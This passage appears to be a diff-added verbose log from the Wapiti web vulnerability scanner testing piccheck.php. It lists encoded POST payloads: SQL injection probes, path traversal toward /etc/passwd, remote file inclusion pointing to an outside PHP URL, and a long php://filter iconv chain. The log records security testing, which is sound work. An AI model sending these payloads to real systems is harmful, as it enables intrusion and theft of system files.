+	data: name=fuzz%22%29%20AND%2016%3D16%20AND%20%28%2239%22%3D%2239&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.068 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%20AND%2047%3D127%20AND%2050%3D50&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.083 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%27%20AND%2092%3D181%20AND%20%2787%27%3D%2787&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.097 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%22%20AND%2038%3D55%20AND%20%2233%22%3D%2233&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.111 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%29%20AND%2089%3D156%20AND%20%2884%3D84&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.124 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%27%29%20AND%2021%3D43%20AND%20%28%2746%27%3D%2746&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.139 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%22%29%20AND%2019%3D70%20AND%20%28%2275%22%3D%2275&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.152 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%20AND%2015%3D60%20AND%2087%3D87
+2024-03-20 14:31:44.166 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%27%20AND%2036%3D107%20AND%20%2742%27%3D%2742
+2024-03-20 14:31:44.180 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%22%20AND%2075%3D100%20AND%20%2247%22%3D%2247
+2024-03-20 14:31:44.195 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%29%20AND%2090%3D135%20AND%20%2813%3D13
+2024-03-20 14:31:44.208 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%27%29%20AND%2057%3D118%20AND%20%28%2733%27%3D%2733
+2024-03-20 14:31:44.223 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%22%29%20AND%2016%3D70%20AND%20%28%2260%22%3D%2260
+2024-03-20 14:31:44.261 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
+2024-03-20 14:31:44.275 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.277 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.287 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.299 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=%2Fetc%2Fpasswd&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.310 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=%2Fetc%2Fpasswd%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.321 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=%2Fetc%2Fservices&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.331 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=%2Fetc%2Fservices%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.343 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.355 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.366 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.377 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.387 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.394 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.404 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.413 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.425 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.436 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.444 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.453 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.461 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.470 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.478 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.487 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.496 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.505 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.513 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.521 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.529 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.539 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.547 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.556 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.563 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.572 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.582 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.590 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.599 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.607 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.616 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.624 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.632 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.640 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.649 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.658 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.668 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.680 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.693 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.707 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.721 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.735 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.746 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.757 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.766 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.774 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=file%3A%2F%2F%2Fetc%2Fpasswd&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.781 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.792 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.805 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.818 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.831 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.843 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&userfile=fuzz&MAX_FILE_SIZE=fuzz
